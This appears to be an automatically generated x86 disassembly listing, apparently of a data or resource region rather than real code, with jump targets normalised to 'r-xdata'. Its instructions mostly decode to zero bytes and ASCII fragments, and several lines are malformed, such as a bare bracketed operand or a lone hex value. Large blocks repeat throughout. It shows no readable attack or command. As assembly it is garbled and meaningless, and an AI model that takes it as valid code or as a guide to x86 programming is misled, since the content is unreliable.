sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
popad
jae r-xdata
add bh bh
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
in al 0x43
add [ ebx + 0x1 ] ah
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ edi - 0x6c4fffbd ] ah
inc esp
add ah cl
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc ecx
add [ eax + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
mov es [ eax + eax - 0x18 ]
mov es [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc esp
add [ eax ] al
insb
enter 0x4378 0x0
adc eax [ edx ]
add bh bh
movsb [ edi ] [ esi ]
test al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
in al dx
into
add [ eax ] dh
mov ah 0x41
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc esp
add [ ecx ] al
sbb [ ecx ] al
pop edi
add [ eax ] al
push [ eax ]
add dh bh
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + ebp * 8 - 0x32 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ esi + 0x44 ]
jae r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
mov eax 0x10043a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al 0xe4
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
xchg esp eax
in al 0x43
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
push esp
adc [ eax ] al
or [ edx ] al
add bh bh
int3
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
inc esp
inc esp
jb r-xdata
add eax 0x16ff0000
add [ 0x6f6c6f43 ] al
jb r-xdata
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
outsd
salc
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
sub_43841c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
popad
jb r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
and al 0xe3
inc ebx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
or al 0xa6
inc ecx
add [ eax ] ah
mov cl 0x43
add [ eax - 0x5a ] al
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add [ ecx + esi * 4 + 0x43 ] al
add [ esp + edx ] dl
inc esp
add [ ebx + ebp * 8 + 0x4aa00044 ] bh
inc esp
add [ ebp + edx + 0x14480044 ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax ] ah
in al dx
inc esp
add [ eax + 0x48004414 ] al
in al dx
inc esp
add ah bl
adc al 0x44
add [ ecx + esi * 4 + 0x43 ] bh
add ah bh
adc al 0x44
add [ eax - 0x14 ] bl
inc esp
add [ eax - 0xfffbbb6 ] ch
adc eax 0x16300044
inc esp
add [ edx - 0x1393ffbc ] bl
inc esp
add [ eax - 0x14 ] dh
inc esp
add [ eax + 0x15 ] al
inc esp
add [ eax + 0x11004412 ] dh
push esp
inc edx
jne r-xdata
add [ eax ] al
add al ah
test [ ebx ] al
sub al 0x0
inc esp
jb r-xdata
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al ah
mov cl 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ ebx + esi * 4 + 0x5f0c0043 ] bl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x4d7bffbc ] al
inc ebx
add [ eax + 0x40043b2 ] ch
add [ eax ] bh
mov ebp 0xffef0014
fcos
and al 0xb3
inc ebx
add [ eax - 0x4d ] dh
inc ebx
add [ edx + esi * 4 ] dh
inc ebx
add [ edx + esi * 4 + 0x43 ] bh
add [ esi ] cl
push esp
inc edx
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ bx + si ]
int3
add ah bh
je r-xdata
inc esp
add [ eax ] bh
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8540c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7a ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg [ ebx ] al
sub al [ esi + 0x20c0043 ]
add [ eax ] al
clc
in eax 0x43
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
dec eax
call [ eax - 0x4b ]
inc ebx
add al al
mov ch 0x43
add [ esi + esi * 4 + 0x43 ] al
add [ esi * 4 - 0x493bffbd ] bh
inc ebx
add [ eax + 0x380043b6 ] bl
mov ah 0x43
add [ esp + esi * 4 + 0x43 ] bl
add [ edi ] al
push esp
inc edx
jne r-xdata
push 0x32dc0044
inc eax
add al bh
mov al [ 0xfffffffffc004035 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add dh bh
je r-xdata
je r-xdata
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
xor al [ eax ]
clc
outsd
insb
lea eax [ eax ]
inc eax
xchg [ ebx ] al
pop es
push cs
push esp
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
aam 0xd5
inc ebx
add [ eax + 0x25 ] dl
inc esp
add [ eax - 0x67ffbbdb ] al
inc ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push [ eax ]
outsb
mov eax eax
enter 0x4387 0x0
pop es
pop es
push esp
inc edx
jne r-xdata
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add ah al
pushad
outsb
inc ebx
outsd
outsb
je r-xdata
add bh bh
jo r-xdata
add [ eax + 0x4208000d ] al
outsb
mov ah 0x86
inc ebx
add [ esi + eax * 4 ] bh
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add ah dl
mov bl 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add al ch
mov ah 0x43
add [ edi + ebx * 2 ] cl
inc esp
add [ esi * 4 + 0x62bc0043 ] ah
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x4d7bffbc ] al
inc ebx
add [ eax + 0x600043b2 ] ch
mov ah 0x43
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
pop eax
inc esi
outsd
insb
inc eax
test [ ebx ] eax
lodsb [ esi ]
jmp 0x4e869d
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
add [ ecx ] al
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc ebx
je r-xdata
inc [ esi + 0x44 ]
jae r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
add al 0xb9
inc ecx
add [ eax ] ch
into
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
add bh bh
inc esp
inc esp
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
push [ esp + esi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ eax ] al
jmp [ eax + ebx + 0x19400044 ]
add [ eax + 0x3c00412e ] dl
add [ eax ] al
inc ah
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sub al 0xd6
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
popad
jo r-xdata
sldt [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
in al 0x18
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
into
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jo r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
shl [ ebx + 0x10043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
add [ eax ] al
and [ ebx ] 0x0
push edi
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
sub al 0x1a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0022 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsb
js r-xdata
loopne r-xdata
jo r-xdata
fadd [ ebx ]
mov eax 0xe00043d8
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
sbb al [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
fiadd [ ebx ]
sbb [ ecx ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
inc ebp
js r-xdata
xlat
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
adc al 0x2
push ebp
jo r-xdata
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add [ eax ] al
hlt
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
jmp eax
insb
fadd [ ebx ]
call 0xffffffffe9428c64
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
fld [ ebx ]
call 0xffffffffe9428b45
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
fild [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
jb r-xdata
or al bl
inc ebx
add al bl
add [ eax ] al
push ebx
je r-xdata
dec edi
outsb
nop
xlat
inc ebx
add al ah
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
jb r-xdata
inc ecx
add [ eax ] dl
mov bh 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
sbb [ edx - 0x5abfffbf ] ah
inc esp
jb r-xdata
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
inc esp
outsd
js r-xdata
test [ di + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x43 ] dl
add [ esi - 0x72 ] ch
inc ebx
add [ edx + eax ] dl
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax ] al
mov ecx 0x5f0c0043
inc esp
add [ eax - 0x47 ] bl
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x488fffbc ] al
inc ebx
add [ eax + edi * 4 + 0x43 ] dh
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x84ff
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
sub_43866c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4387 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi - 0x7845ffbd ] al
inc ebx
add [ eax ] bl
add al [ eax ]
add ah dh
test [ ebx ] al
and [ ebp + 0x35980041 ] ah
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add ah dl
mov bl 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add al ch
mov ah 0x43
add [ edi + ebx * 2 ] cl
inc esp
add [ esi * 4 + 0x62bc0043 ] ah
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x4d7bffbc ] al
inc ebx
add [ eax + 0x600043b2 ] ch
mov ah 0x43
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
call [ eax - 0x4b ]
inc ebx
add al al
mov ch 0x43
add [ esi + esi * 4 + 0x43 ] al
add [ esi * 4 - 0x493bffbd ] bh
inc ebx
add [ eax + 0x380043b6 ] bl
mov ah 0x43
add [ esp + esi * 4 + 0x43 ] bl
add [ edi ] al
push esp
inc edx
jne r-xdata
add dh bh
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
aam 0xd5
inc ebx
add [ eax + 0x25 ] dl
inc esp
add [ eax - 0x67ffbbdb ] al
inc ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push [ eax ]
outsb
mov eax eax
enter 0x4387 0x0
pop es
pop es
push esp
inc edx
jne r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add bh bh
jo r-xdata
add [ eax + 0x4208000d ] al
outsb
mov ah 0x86
inc ebx
add [ esi + eax * 4 ] bh
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
add [ ecx ] al
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc ebx
je r-xdata
inc [ esi + 0x44 ]
jae r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
